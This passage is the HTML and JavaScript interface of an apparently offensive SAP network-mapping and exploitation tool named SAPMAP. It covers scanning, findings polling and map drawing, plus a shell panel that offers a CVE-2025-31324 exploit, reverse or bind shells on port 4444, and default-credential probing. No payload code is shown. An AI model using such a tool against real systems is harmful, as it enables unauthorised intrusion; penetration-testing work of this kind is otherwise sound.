            <option value="cve_31324">CVE-2025-31324 (Java unauth)</option>
          </select>
        </div>
        <div style="flex:1">
          <label style="font-size:11px;color:#8b949e">Shell Mode</label>
          <select id="shell-mode" style="width:100%" onchange="shellModeChanged()">
            <option value="reverse">Reverse Shell (target connects to us)</option>
            <option value="bind">Bind Shell (we connect to target)</option>
          </select>
        </div>
      </div>
      <div style="display:flex;gap:8px;margin-bottom:8px">
        <div style="flex:1" id="shell-ip-row">
          <label style="font-size:11px;color:#8b949e">Callback IP (our IP)</label>
          <input type="text" id="shell-ip" placeholder="auto-detecting..." style="width:100%">
        </div>
        <div style="width:80px">
          <label style="font-size:11px;color:#8b949e">Port</label>
          <input type="text" id="shell-port" value="4444" style="width:100%">
        </div>
      </div>
      <div style="font-size:10px;color:#484f58;margin-bottom:8px" id="shell-payload-preview"></div>
      <button class="btn btn-primary" onclick="shellStart()" style="width:100%">&#9654; Start Listener &amp; Send Payload</button>
    </div>
    <div id="shell-status-bar" style="display:none;padding:6px 0;font-size:12px">
      <span id="shell-status-dot" style="display:inline-block;width:10px;height:10px;border-radius:50%;background:#484f58;margin-right:6px;vertical-align:middle"></span>
      <span id="shell-status-text">Idle</span>
    </div>
    <div id="shell-terminal" style="display:none;background:#010409;border:1px solid #30363d;border-radius:4px;
      padding:8px;margin-top:4px;font-family:monospace;font-size:12px;color:#7ee787;
      min-height:200px;flex:1;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
      user-select:text;-webkit-user-select:text;cursor:text"></div>
    <div id="shell-input-bar" style="display:none;margin-top:4px;gap:4px">
      <input type="text" id="shell-input" placeholder="Type command..." style="flex:1;font-family:monospace"
             disabled autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false"
             onkeydown="if(event.key==='Enter'){event.preventDefault();shellSendInput();}">
      <button class="btn" onclick="shellSendInput()" id="shell-send-btn" disabled>Send</button>
    </div>
    <div class="form-actions" style="margin-top:8px;flex-shrink:0">
      <button class="btn btn-danger" onclick="shellStop()" id="shell-stop-btn" style="display:none">&#9724; Stop</button>
      <button class="btn" onclick="shellClose()">Close</button>
    </div>
    </div>
    <div class="shell-resize-handle" id="shell-resize-handle"></div>
  </div>
</div>

<!-- Hidden file picker for Load State -->
<input type="file" id="file-picker" accept=".sapmap,.json" style="display:none" onchange="handleFileLoad(this)">

<script>
/* =========================================================================
   SAPMAP Frontend JavaScript
   ========================================================================= */

// --- State ---
let mapState = { nodes: {}, connections: [], stats: {} };
let localIp = '';
fetch('/api/local_ip').then(r => r.json()).then(d => { localIp = d.ip || ''; }).catch(() => {});
let consoleCursor = 0;
let findingsCursor = 0;
let _activeFindings = [];
// Manual dismissal → hide from banner, drawer AND node badge.
let _dismissedFindingIds = new Set();
// Auto-expire (5 s) → hide from banner only; badge + drawer keep it.
let _bannerHiddenIds = new Set();
let _findingsDrawerOpen = false;
let pollTimer = null;
let selectedNodeSid = null;
let dragNode = null;
let dragOffset = { x: 0, y: 0 };
let dragMoved = false;
let dragStartPos = { x: 0, y: 0 };
let unkPositions = {};  // persistent positions for unknown target boxes
let activeTasks = {};   // key → label for active background operations
let knownNodeSids = new Set();   // SIDs seen in previous renders
let knownConnKeys = new Set();   // connection keys seen in previous renders
let firstRender = true;          // skip animations on initial load
let fadingNodes = {};            // sid → { start, duration } for nodes currently fading in
let viewBox = { x: 0, y: 0, w: 1200, h: 800 };
let viewBoxUserControlled = false;  // true once user zooms/pans
let isPanning = false;
let panStart = { x: 0, y: 0 };

// Pill colors matching SAPology
const PILL_COLORS = {
  'ABAP': '#0070f2', 'JAVA': '#d27700', 'ABAP+JAVA': '#0070f2',
  'BUSINESSOBJECTS': '#8b47d7', 'CLOUD_CONNECTOR': '#046c7a',
  'CONTENT_SERVER': '#256f3a', 'SAPROUTER': '#788fa6', 'MDM': '#5d36ff',
  'HANA': '#aa0808', 'MAXDB': '#e07900', 'MSSQL': '#2f5ea0',
  'ORACLE': '#c74634', 'DB2': '#054ada'
};
const PILL_LABELS = {
  'ABAP': 'ABAP', 'JAVA': 'Java', 'ABAP+JAVA': 'AB+Java',
  'BUSINESSOBJECTS': 'BO', 'CLOUD_CONNECTOR': 'SCC',
  'CONTENT_SERVER': 'Content', 'SAPROUTER': 'SAProuter', 'MDM': 'MDM',
  'HANA': 'HANA', 'MAXDB': 'MaxDB', 'MSSQL': 'MSSQL',
  'ORACLE': 'Oracle', 'DB2': 'DB2'
};

// --- API helpers ---
async function api(method, path, body) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (body) opts.body = JSON.stringify(body);
  const res = await fetch('/api/' + path, opts);
  return res.json();
}

// --- Scan control ---
async function startScan() {
  const config = {
    targets: document.getElementById('targets').value,
    inst_from: parseInt(document.getElementById('inst-from').value),
    inst_to: parseInt(document.getElementById('inst-to').value),
    threads: parseInt(document.getElementById('threads').value),
    timeout: parseFloat(document.getElementById('timeout').value) || 3,
    fast_mode: document.querySelector('input[name="scanmode"]:checked').value === 'fast',
    concurrent_hosts: parseInt(document.getElementById('adv-concurrent').value) || 5,
    port_timeout: parseFloat(document.getElementById('adv-port-timeout').value) || 2.0,
    alive_timeout: parseFloat(document.getElementById('adv-alive-timeout').value) || 0.5,
    skip_alive: document.getElementById('adv-skip-alive').checked,
    scc_probe_default_creds: !!(document.getElementById('adv-scc-probe-creds') && document.getElementById('adv-scc-probe-creds').checked),
  };
  // Keep console history across scans — the operator wants to see prior
  // scan output too.  The backend appends a "New scan: ..." divider so
  // the boundary between scans stays obvious; polling picks up the
  // divider plus all subsequent lines from where the cursor left off.
  // Reset the findings bus (banner + drawer) for the new scan
  findingsCursor = 0;
  _activeFindings = [];
  _dismissedFindingIds = new Set();
  _bannerHiddenIds = new Set();
  renderFindings();
  _maybeAskNotifPermission();
  try { await api('POST', 'findings/clear'); } catch (_) {}
  await api('POST', 'scan/start', config);
  document.getElementById('st-status').textContent = 'Scanning...';
  startPolling();
}

function toggleAdvanced() {
  const adv = document.getElementById('toolbar-adv');
  adv.style.display = adv.style.display === 'none' ? 'flex' : 'none';
}

let consoleMaximized = false;
function maximizeConsole() {
  const container = document.getElementById('console-container');
  const body = document.getElementById('console-body');
  const mapContainer = document.getElementById('map-container');
  const legendBar = document.getElementById('legend-bar');
  if (consoleMaximized) {
    container.style.height = '180px';
    container.style.flex = '';
    body.style.overflow = '';
    mapContainer.style.display = '';
    legendBar.style.display = '';
    consoleMaximized = false;
  } else {
    container.style.height = '';
    container.style.flex = '1 1 auto';
    body.style.overflow = 'auto';
    mapContainer.style.display = 'none';
    legendBar.style.display = 'none';
    consoleMaximized = true;
  }
}

async function stopScan() {
  const r = await api('POST', 'scan/stop');
  const bt = (r && r.betrusted_cancelled) || 0;
  document.getElementById('st-status').textContent =
    bt ? `Cancelled (+${bt} 10KBlaze)` : 'Cancelled';
}

// --- Polling ---
function startPolling() {
  if (pollTimer) return;
  pollTimer = setInterval(pollUpdates, 800);
}

function stopPolling() {
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
}

async function pollUpdates() {
  try {
    // Poll console
    const consoleData = await api('GET', 'console?cursor=' + consoleCursor);
    if (consoleData.lines && consoleData.lines.length > 0) {
      const body = document.getElementById('console-body');
      for (const line of consoleData.lines) {
        const div = document.createElement('div');
        div.className = line.cls || 'cl-info';
        div.innerHTML = '<span style="color:#484f58">' + line.ts + '</span> ' + line.text;
        body.appendChild(div);
        // Detect [ACTION_NEEDED] tags — the backend uses these when
        // it hits a state the operator must resolve manually (e.g.
        // pre-existing user whose password can't be reset to
        // productive via RFC).  Surface as a sticky toast so it
        // doesn't get buried in console scroll.
        const t = (line.text || '');
        const mAct = t.match(/\[ACTION_NEEDED\]\s*(.*)$/);
        if (mAct) {
          showToast(
            '<div style="display:flex;justify-content:space-between;'
              + 'align-items:center;margin-bottom:6px">'
              + '<strong style="color:#d29922">&#9888; Operator '
                + 'action needed</strong>'
              + '<span data-close style="cursor:pointer;color:#8b949e;'
                + 'font-size:14px;margin-left:12px" title="dismiss">&times;</span>'
            + '</div>'
            + '<div style="color:#c9d1d9;line-height:1.45">'
              + mAct[1]
            + '</div>'
            + '<div style="margin-top:8px;text-align:right">'
              + '<button class="btn" style="padding:3px 10px;'
                + 'font-size:11px" data-close>Dismiss</button>'
            + '</div>',
            {stickUntilClose: true}
          );
          // Also recolour the console line so the context around
          // the toast stays easy to find on scroll-back.
          div.style.borderLeft = '3px solid #d29922';
          div.style.paddingLeft = '6px';
        }
      }
      body.scrollTop = body.scrollHeight;
      consoleCursor = consoleData.cursor;
    }

    // Poll findings (critical-finding banner + drawer)
    try {
      const fd = await api('GET', 'findings?cursor=' + findingsCursor);
      if (fd && Array.isArray(fd.findings) && fd.findings.length > 0) {
        for (const rec of fd.findings) {
          _activeFindings.push(rec);
          // Auto-dismiss banner rows after 5 s — the drawer + console
          // keep the full history, so no information is lost.
          if (rec.severity === 'CRITICAL' || rec.severity === 'HIGH'
              || rec.severity === 'INFO') {
            // INFO auto-dismisses in both banner AND badge (noisy scan
            // events shouldn't leave a long-lived badge trail).
            setTimeout((id, sev) => {
              _bannerHiddenIds.add(id);
              if (sev === 'INFO') _dismissedFindingIds.add(id);
              renderFindings();
              try { updateMap(); } catch (_) {}
            }, 5000, rec.id, rec.severity);
          }
          // Desktop notification for CRITICAL when the window isn't
          // focused — operators who left the tab open during a long
          // exploit chain get a native OS pop when something pwns.
          if (rec.severity === 'CRITICAL') _maybeNotifyDesktop(rec);
          // Map pulse — light up the affected node (and, for findings
          // that carry a source/target pair in meta, the connection too).
          // Deferred one tick so the node's _x/_y is guaranteed to be set
          // by an in-flight updateMap() for a just-plotted system.
          setTimeout(() => { try { _maybePulseFromFinding(rec); } catch (_) {} }, 50);
        }
        findingsCursor = fd.cursor || findingsCursor;
        renderFindings();
        try { updateMap(); } catch (_) {}
      }
    } catch (_) { /* findings polling never blocks state refresh */ }

    // Poll state
    const state = await api('GET', 'state');
    if (state) {
      // Preserve dragged node positions across state refreshes
      const oldNodes = mapState.nodes || {};
      for (const sid in state.nodes || {}) {
        if (oldNodes[sid] && oldNodes[sid]._x != null) {
          state.nodes[sid]._x = oldNodes[sid]._x;
          state.nodes[sid]._y = oldNodes[sid]._y;
        }
      }
      const oldScc = mapState.scc_nodes || {};
      for (const h in state.scc_nodes || {}) {
        if (oldScc[h] && oldScc[h]._x != null) {
          state.scc_nodes[h]._x = oldScc[h]._x;
          state.scc_nodes[h]._y = oldScc[h]._y;
        }
      }
      const oldBtp = mapState.btp_subaccounts || {};
      for (const u in state.btp_subaccounts || {}) {
        if (oldBtp[u] && oldBtp[u]._x != null) {
          state.btp_subaccounts[u]._x = oldBtp[u]._x;
          state.btp_subaccounts[u]._y = oldBtp[u]._y;
        }
      }
      mapState = state;
      activeTasks = state.active_tasks || {};
      updateMap();
      updateStatusBar();
      updateActivityBar();
      if (state.scan_state === 'complete' || state.scan_state === 'error' ||
          state.scan_state === 'cancelled') {
        document.getElementById('st-status').textContent =
          state.scan_state.charAt(0).toUpperCase() + state.scan_state.slice(1);
      }
    }

    // Poll UI commands (from script runner)
    try {
      const cmds = await api('GET', 'ui/commands');
      if (cmds && cmds.length) {
        for (const c of cmds) {
          if (c.cmd === 'show_impact') showImpactDetail(c.sid);
          else if (c.cmd === 'show_chains') { const r = await fetch('/api/chains'); const d = await r.json(); showChainResults(d.chains || []); }
          else if (c.cmd === 'show_detail') showSystemDetail(c.sid);
          else if (c.cmd === 'highlight_chain') highlightChain(c.path_sids);
          else if (c.cmd === 'relayout') {
            const m = (c.mode || '').toLowerCase();
            if      (m === 'circle')     layoutCircle();
            else if (m === 'star')       layoutStar();
            else if (m === 'hierarchy')  layoutHierarchy();
            else if (m === 'stack'
                  || m === 'by_stack')   layoutByStack();
            else if (m === 'reset')      resetLayout();
            else console.warn('relayout: unknown mode', c.mode);
          }
          else if (c.cmd === 'flash_activity') {
            flashActivity(c.label || 'Working', c.hold_ms);
          }
        }
      }
    } catch(e2) {}
  } catch (e) {
    // Server not responding
  }
}

// --- Map rendering ---
function updateMap() {
  const nodes = mapState.nodes || {};
  const conns = mapState.connections || [];
  const nodeKeys = Object.keys(nodes);
  const _sccCount = Object.keys(mapState.scc_nodes || {}).length;
  const _btpCount = Object.keys(mapState.btp_subaccounts || {}).length;

  if (nodeKeys.length === 0 && _sccCount === 0 && _btpCount === 0) {
    const _msg = document.getElementById('empty-msg');
    // Swap the "start a scan" prompt for live-progress text once a
    // scan is actually running — covers both the toolbar Scan
    // button and the script-runner-driven `scan` action.
    const _scanState = (mapState.scan_state || '').toLowerCase();
    if (_scanState === 'running') {
      _msg.textContent = 'A scan has started — discovered systems '
                          + 'will appear here as soon as they are '
                          + 'fingerprinted…';
    } else if (_scanState === 'cancelled') {
      _msg.textContent = 'Scan cancelled — no systems were '
                          + 'discovered.  Start another scan or load '
                          + 'a saved state.';
    } else if (_scanState === 'error') {
      _msg.textContent = 'Scan errored — check the console output. '
                          + 'Start another scan or load a saved state.';
    } else {
      _msg.textContent = 'Start a scan or load a saved state to '
                          + 'discover SAP systems';
    }
    _msg.style.display = 'block';
    document.getElementById('legend-bar').style.display = 'none';
    document.getElementById('map-svg').innerHTML = '';
    return;
  }
  document.getElementById('empty-msg').style.display = 'none';
  document.getElementById('legend-bar').style.display = 'flex';

  const svg = document.getElementById('map-svg');
  const BOX_W = 240, BOX_H = 174, MARGIN = 60;
  const cols = Math.max(1, Math.min(4, nodeKeys.length));

  // Auto-layout: zone-aware placement
  // ------------------------------------------------------------------
  // Nodes that share an IP (co-located on the same host) are placed in
  // the same vertical column so their hosting-zone box doesn't overlap
  // with other zones.  "Lone" nodes (unique IPs) each get their own
  // column.  SCC nodes for the same IP share the column with their SAP
  // siblings.
  //
  // Already-positioned nodes (n._x != null) are left untouched — the
  // user may have manually arranged them.  Only fresh nodes get laid out.
  // ------------------------------------------------------------------
  const sccNodes = mapState.scc_nodes || {};
  const sccKeys = Object.keys(sccNodes);
  const btpNodes = mapState.btp_subaccounts || {};
  const btpKeys = Object.keys(btpNodes);

  // Cloud-tier reservation: BTP subaccounts live in a strip above
  // the on-prem layer.  When at least one BTP node exists, on-prem
  // zone layouts start one row + gap further down so the cloud tier
  // has breathing room.
  const TOP_TIER_H = btpKeys.length > 0 ? (BOX_H + MARGIN * 2) : 0;

  const IP_RE_LO = /^\d{1,3}(\.\d{1,3}){3}$/;
  const getIP = n => {
    if (n.ip && IP_RE_LO.test(n.ip)) return n.ip;
    if (n.hostname && IP_RE_LO.test(n.hostname)) return n.hostname;
    if (n.host && IP_RE_LO.test(n.host)) return n.host;
    return null;
  };

  // Build zone groups: ip → [ {kind:'sap'|'scc', id, obj} ]
  const zoneGroups = {};   // ip  → array of members
  const noIPGroup  = [];   // nodes/sccs with no known IP
  nodeKeys.forEach(sid => {
    const ip = getIP(nodes[sid]);
    if (ip) { (zoneGroups[ip] = zoneGroups[ip] || []).push({kind:'sap', id:sid, obj:nodes[sid]}); }
    else noIPGroup.push({kind:'sap', id:sid, obj:nodes[sid]});
  });
  sccKeys.forEach(host => {
    const ip = getIP(sccNodes[host]);
    if (ip) { (zoneGroups[ip] = zoneGroups[ip] || []).push({kind:'scc', id:host, obj:sccNodes[host]}); }
    else noIPGroup.push({kind:'scc', id:host, obj:sccNodes[host]});
  });

  // Separate zones that are fully-placed (all members have _x) from
  // those that need layout work.
  const allGroups = [...Object.values(zoneGroups), ...(noIPGroup.length ? [noIPGroup] : [])];

  // Determine the rightmost X already occupied by any placed node so
  // we can park new zones to its right without overlapping.
  let cursorX = MARGIN;
  allGroups.forEach(members => {
    members.forEach(({obj}) => {
      if (obj._x != null) cursorX = Math.max(cursorX, obj._x + BOX_W + MARGIN * 2);
    });
  });

  // Zone column width: up to 2 SAP-box widths side by side (SAP+SCC pair
  // or lone SAP) plus a gap between zones.
  const ZONE_GAP   = MARGIN * 2;   // horizontal gap between zones
  const COL_STRIDE = BOX_W + MARGIN;

  allGroups.forEach(members => {
    // Skip groups that are already fully placed
    const needsPlace = members.filter(m => m.obj._x == null);
    if (!needsPlace.length) return;

    // Find leftmost X of already-placed members in this group (so new
    // members in the same zone land near their siblings).
    let zoneX = null;
    members.forEach(({obj}) => {
      if (obj._x != null) zoneX = (zoneX == null) ? obj._x : Math.min(zoneX, obj._x);
    });
    if (zoneX == null) {
      zoneX = cursorX;
    }

    // Stack unplaced members in a single column, top-to-bottom.
    // Find the lowest Y already occupied in this zone.  When BTP nodes
    // exist they take the top tier; on-prem zones start below it.
    let zoneY = MARGIN + TOP_TIER_H;
    members.forEach(({obj}) => {
      if (obj._x != null) zoneY = Math.max(zoneY, obj._y + BOX_H + MARGIN);
    });

    needsPlace.forEach(({obj}) => {
      obj._x = zoneX;
      obj._y = zoneY;
      zoneY += BOX_H + MARGIN;
    });

    // Advance the global cursor past this zone for the next group
    cursorX = Math.max(cursorX, zoneX + BOX_W + ZONE_GAP);
  });

  // BTP cloud tier: place subaccount nodes in a horizontal strip at
  // the top of the canvas.  Manually-positioned nodes are left alone.
  // When on-prem nodes already occupy the top row (e.g. they were
  // dragged there or laid out before any BTP node existed), shift
  // the new BTP node past their rightmost edge so it doesn't land
  // ON TOP of S4H — operator's exact symptom after a harvest+mint
  // round.
  if (btpKeys.length > 0) {
    let btpX = MARGIN;
    // Anchor past every already-positioned node that overlaps the
    // BTP-tier vertical band [MARGIN, MARGIN + BOX_H].
    const _topBandHi = MARGIN + BOX_H;
    Object.values(nodes).forEach(n => {
      if (n._x != null && n._y != null
          && n._y < _topBandHi && n._y + BOX_H > MARGIN) {
        btpX = Math.max(btpX, n._x + BOX_W + MARGIN);
      }
    });
    Object.values(sccNodes).forEach(sn => {
      if (sn._x != null && sn._y != null
          && sn._y < _topBandHi && sn._y + BOX_H > MARGIN) {
        btpX = Math.max(btpX, sn._x + BOX_W + MARGIN);
      }
    });
    // Also stack BTP nodes that already have positions
    btpKeys.forEach(uuid => {
      const bn = btpNodes[uuid];
      if (bn._x != null) {
        btpX = Math.max(btpX, bn._x + BOX_W + MARGIN);
      }
    });
    btpKeys.forEach(uuid => {
      const bn = btpNodes[uuid];
      if (bn._x == null) {
        bn._x = btpX;
        bn._y = MARGIN;
        btpX += BOX_W + MARGIN;
      }
    });
  }

  // Compute content bounds (needed for initial auto-fit and fitMap)
  let maxX = 0, maxY = 0;
  nodeKeys.forEach(sid => {
    const n = nodes[sid];
    maxX = Math.max(maxX, (n._x || 0) + BOX_W + MARGIN);
    maxY = Math.max(maxY, (n._y || 0) + BOX_H + MARGIN);
  });
  sccKeys.forEach(host => {
    const sn = sccNodes[host];
    maxX = Math.max(maxX, (sn._x || 0) + BOX_W + MARGIN);
    maxY = Math.max(maxY, (sn._y || 0) + BOX_H + MARGIN);
  });
  btpKeys.forEach(uuid => {
    const bn = btpNodes[uuid];
    maxX = Math.max(maxX, (bn._x || 0) + BOX_W + MARGIN);
    maxY = Math.max(maxY, (bn._y || 0) + BOX_H + MARGIN);
  });

  let html = '';

  // Collect unknown targets when checkbox is on
  const showUnknown = document.getElementById('show-unknown') && document.getElementById('show-unknown').checked;
  const unknownTargets = {};  // host -> { _x, _y, label }
  if (showUnknown) {
    let unkIdx = 0;
    conns.forEach(conn => {
      const srcNode = nodes[conn.source_sid];
      const tgtNode = nodes[conn.target_sid];
      if (srcNode && !tgtNode) {
        const key = conn.target_host || conn.target_sid || ('unk_' + unkIdx++);
        if (!unknownTargets[key]) {
          unknownTargets[key] = {
            label: conn.target_host || conn.target_sid || '?',
            _x: null, _y: null,
          };
        }
      }
    });
    // Position unknown target nodes to the right of the known nodes
    let unkCol = 0;
    const unkStartX = maxX + MARGIN;
    for (const key in unknownTargets) {
      const ut = unknownTargets[key];
      if (unkPositions[key]) {
        ut._x = unkPositions[key]._x;
        ut._y = unkPositions[key]._y;
      } else {
        ut._x = unkStartX;
        ut._y = MARGIN + unkCol * (BOX_H + MARGIN);
        unkPositions[key] = { _x: ut._x, _y: ut._y };
      }
      unkCol++;
    }
    // Update bounds for viewBox
    for (const key in unknownTargets) {
      maxX = Math.max(maxX, unknownTargets[key]._x + BOX_W + MARGIN);
      maxY = Math.max(maxY, unknownTargets[key]._y + BOX_H + MARGIN);
    }
  }

  // Set viewBox (after unknown targets are positioned so bounds include them)
  if (!viewBoxUserControlled || viewBox._nodeCount !== nodeKeys.length) {
    viewBox.w = Math.max(maxX, 800);
    viewBox.h = Math.max(maxY, 600);
    viewBox._nodeCount = nodeKeys.length;
  }
  svg.setAttribute('viewBox', `${viewBox.x} ${viewBox.y} ${viewBox.w} ${viewBox.h}`);

  // Count connections per source→target pair for curve offsets
  const pairCount = {};
  const pairIdx = {};
  conns.forEach((conn, ci) => {
    // Use sorted pair key so A→B and B→A share offset space
    const a = conn.source_sid || '', b = conn.target_sid || conn.target_host || '';
    const pairKey = a < b ? a + '|' + b : b + '|' + a;
    pairCount[pairKey] = (pairCount[pairKey] || 0) + 1;
  });
  conns.forEach((conn, ci) => {
    const a = conn.source_sid || '', b = conn.target_sid || conn.target_host || '';
    const pairKey = a < b ? a + '|' + b : b + '|' + a;
    pairIdx[ci] = (pairIdx[ci - 1] !== undefined ? 0 : 0);  // placeholder
  });
  // Assign index within each pair
  const pairCurrent = {};
  conns.forEach((conn, ci) => {
    const a = conn.source_sid || '', b = conn.target_sid || conn.target_host || '';
    const pairKey = a < b ? a + '|' + b : b + '|' + a;
    pairCurrent[pairKey] = (pairCurrent[pairKey] || 0);
    pairIdx[ci] = pairCurrent[pairKey];
    pairCurrent[pairKey]++;
  });

  // Snapshot previous state for animation detection
  const prevNodes = new Set(knownNodeSids);
  const prevConns = new Set(knownConnKeys);

  // ── Hosting-zone background boxes ───────────────────────────────────────
  // Group every node (SAP + SCC) by its canonical IP address.  Nodes that
  // share an IP are co-located on the same physical host and get a common
  // background zone drawn behind them.
  {
    const IP_RE = /^\d{1,3}(\.\d{1,3}){3}$/;
    // ip -> [ {x, y, w, h, label, nodeType} ]
    const zoneMap = {};
    const addToZone = (ip, x, y, label, nodeType) => {
      if (!ip || !IP_RE.test(ip)) return;
      if (x == null || y == null) return;
      if (!zoneMap[ip]) zoneMap[ip] = [];
      zoneMap[ip].push({ x, y, w: BOX_W, h: BOX_H, label, nodeType });
    };

    Object.entries(nodes).forEach(([sid, n]) => {
      const ip = n.ip || (IP_RE.test(n.hostname||'') ? n.hostname : '');
      addToZone(ip, n._x, n._y, sid, 'sap');
    });
    Object.entries(sccNodes).forEach(([host, sn]) => {
      const ip = sn.ip || (IP_RE.test(sn.host||'') ? sn.host : '');
      addToZone(ip, sn._x, sn._y, host, 'scc');
    });

    const PAD = 28;
    Object.entries(zoneMap).forEach(([ip, members]) => {
      if (members.length < 2) return;
      const xs = members.map(m => m.x);
      const ys = members.map(m => m.y);
      const zx = Math.min(...xs) - PAD;
      const zy = Math.min(...ys) - PAD - 18;  // 18px headroom for label
      const zw = Math.max(...members.map(m => m.x + m.w)) + PAD - zx;
      const zh = Math.max(...members.map(m => m.y + m.h)) + PAD - zy;

      // Subtle dark-teal zone fill + dashed border
      html += `<rect x="${zx}" y="${zy}" width="${zw}" height="${zh}" ` +
              `rx="14" fill="#111e26" fill-opacity="0.55" ` +
              `stroke="#2e5060" stroke-width="1.5" stroke-dasharray="7,4" />`;

      // Label: hostname from any member that has one, else the raw IP
      const allNodes = [
        ...Object.values(nodes).filter(n => {
          const nip = n.ip || (IP_RE.test(n.hostname||'') ? n.hostname : '');
          return nip === ip;
        }),
        ...Object.values(sccNodes).filter(sn => {
          const snip = sn.ip || (IP_RE.test(sn.host||'') ? sn.host : '');
          return snip === ip;
        }),
      ];
      const hostnameHint = allNodes
        .map(x => x.hostname || '')
        .find(h => h && !IP_RE.test(h)) || '';
      const labelText = hostnameHint ? `${ip}  (${hostnameHint})` : ip;
      const typeIcons = [...new Set(members.map(m =>
        m.nodeType === 'scc' ? '⬡ SCC' : '▣ SAP')
      )].join('  ');

      html += `<text x="${zx + 12}" y="${zy + 14}" ` +
              `fill="#4a7a8a" font-size="10" font-weight="bold" ` +
              `font-family="monospace" pointer-events="none">` +
              `🖥 ${escHtml(labelText)}</text>`;
      html += `<text x="${zx + zw - 8}" y="${zy + 14}" ` +
              `text-anchor="end" fill="#2e5060" font-size="9" ` +
              `font-family="monospace" pointer-events="none">` +
              `${escHtml(typeIcons)}</text>`;
    });
  }
  // ─────────────────────────────────────────────────────────────────────────

  // Draw connections first (behind nodes)
  const newConnKeys = new Set();
  // Resolve BTP-sentinel source SIDs ("BTP:<uuid8>") against the
  // btp_subaccounts dict so synthetic BTP→on-prem edges from
  // link_destinations_to_onprem actually render.
  const _resolveBtpSrc = (sid) => {
    if (!sid || !sid.startsWith('BTP:')) return null;
    const suffix = sid.slice(4);
    for (const u in btpNodes) {
      if (u.startsWith(suffix)) return btpNodes[u];
    }
    return null;
  };
  conns.forEach((conn, ci) => {
    let srcNode = nodes[conn.source_sid] || _resolveBtpSrc(conn.source_sid);
    let tgtNode = nodes[conn.target_sid];

    if (!tgtNode && showUnknown) {
      const key = conn.target_host || conn.target_sid || '';
      tgtNode = unknownTargets[key];
    }
    if (!srcNode || !tgtNode) return;

    const connKey = conn.source_sid + '|' + conn.destination_name;
    newConnKeys.add(connKey);
    const isNewConn = !firstRender && !prevConns.has(connKey);
    const newAttr = isNewConn ? ' data-new="1"' : '';

    let color = '#5dade2';
    let width = 4;
    let dashArray = '';
    const isHttp = (conn.conn_type || '') === 'http';
    if (conn.has_sap_all && conn.logon_successful) {
      color = '#e74c3c'; width = 6;
    } else if (conn.sapxpg_remote_works) {
      color = '#ff6b35'; width = 5.5; dashArray = '8,4';
    } else if (conn.logon_successful) {
      color = '#2ecc71'; width = 5;
    } else if (isHttp) {
      // HTTP destination — default style before any connectivity test.
      // Purple-ish; dotted to distinguish from untested RFC edges.
      color = '#a371f7'; width = 4; dashArray = '3,4';
    }

    // Arrow marker
    html += `<defs><marker id="arrow-${ci}" markerWidth="14" markerHeight="10" ` +
      `refX="13" refY="5" orient="auto" markerUnits="userSpaceOnUse"><polygon points="0 0, 14 5, 0 10" fill="${color}"/></marker></defs>`;

    const dashAttr = dashArray ? ` stroke-dasharray="${dashArray}"` : '';

    // Self-loop: source and target are the same node
    const isSelf = conn.source_sid && conn.source_sid === conn.target_sid;
    if (isSelf) {
      const nx = srcNode._x || 0, ny = srcNode._y || 0;
      // Count self-loops on this node for stacking
      const selfKey = conn.source_sid + '|' + conn.source_sid;
      const selfTotal = pairCount[selfKey] || 1;
      const selfIdx = pairIdx[ci] || 0;
      // Loop exits right side, arcs out and comes back
      const loopR = 30 + selfIdx * 20;
      const startY = ny + BOX_H * 0.3 + selfIdx * 12;
      const endY = ny + BOX_H * 0.7 + selfIdx * 12;
      // Clamp to box height
      const sy = Math.min(startY, ny + BOX_H - 4);
      const ey = Math.min(endY, ny + BOX_H - 4);
      const sx = nx + BOX_W;  // right edge
      const cpx = sx + loopR;
      html += `<path class="edge-line" d="M${sx},${sy} C${cpx},${sy} ${cpx},${ey} ${sx},${ey}" ` +
        `stroke="${color}" stroke-width="${width}" fill="none"${dashAttr}${newAttr} data-orig-dash="${dashArray}" ` +
        `marker-end="url(#arrow-${ci})" data-conn-idx="${ci}" ` +
        `onclick="showConnInfo(event, ${ci})" />`;
      // Label to the right of the loop
      let label = conn.destination_name || '';
      if (conn.rfc_user) label += ' / ' + conn.rfc_user;
      if (conn.has_sap_all) label += ' (SAP_ALL)';
      const lx = cpx + 4, ly = (sy + ey) / 2 + 3;
      html += `<text x="${lx}" y="${ly}" text-anchor="start" font-size="10" ` +
        `fill="#8b949e" font-family="monospace" pointer-events="none">${escHtml(label)}</text>`;
      return;  // done with this self-loop connection
    }

    const cx1 = (srcNode._x || 0) + BOX_W / 2;
    const cy1 = (srcNode._y || 0) + BOX_H / 2;
    const cx2 = (tgtNode._x || 0) + BOX_W / 2;
    const cy2 = (tgtNode._y || 0) + BOX_H / 2;

    // Clip line endpoints to box edges so arrows are visible
    function clipToBox(fromX, fromY, toX, toY, bw, bh) {
      const dx = fromX - toX, dy = fromY - toY;
      const len = Math.sqrt(dx*dx + dy*dy) || 1;
      const ux = dx / len, uy = dy / len;
      const hw = bw / 2, hh = bh / 2;
      const sx = ux !== 0 ? hw / Math.abs(ux) : Infinity;
      const sy = uy !== 0 ? hh / Math.abs(uy) : Infinity;
      const s = Math.min(sx, sy);
      return { x: toX + ux * s, y: toY + uy * s };
    }
    const src = clipToBox(cx2, cy2, cx1, cy1, BOX_W, BOX_H);
    const tgt = clipToBox(cx1, cy1, cx2, cy2, BOX_W, BOX_H);
    const x1 = src.x, y1 = src.y, x2 = tgt.x, y2 = tgt.y;

    // Determine curve offset for parallel connections
    // Use canonical (sorted) direction for the perpendicular so that
    // A→B and B→A connections curve to opposite sides instead of overlapping.
    const a = conn.source_sid || '', b = conn.target_sid || conn.target_host || '';
    const pairKey = a < b ? a + '|' + b : b + '|' + a;
    const total = pairCount[pairKey] || 1;
    const idx = pairIdx[ci] || 0;

    if (total === 1) {
      html += `<line class="edge-line" x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" ` +
        `stroke="${color}" stroke-width="${width}" fill="none"${dashAttr}${newAttr} data-orig-dash="${dashArray}" ` +
        `marker-end="url(#arrow-${ci})" data-conn-idx="${ci}" ` +
        `onclick="showConnInfo(event, ${ci})" />`;
    } else {
      const mx = (x1 + x2) / 2, my = (y1 + y2) / 2;
      // Canonical direction: always from alphabetically smaller to larger SID
      const cdx = a < b ? (cx2 - cx1) : (cx1 - cx2);
      const cdy = a < b ? (cy2 - cy1) : (cy1 - cy2);
      const len = Math.sqrt(cdx*cdx + cdy*cdy) || 1;
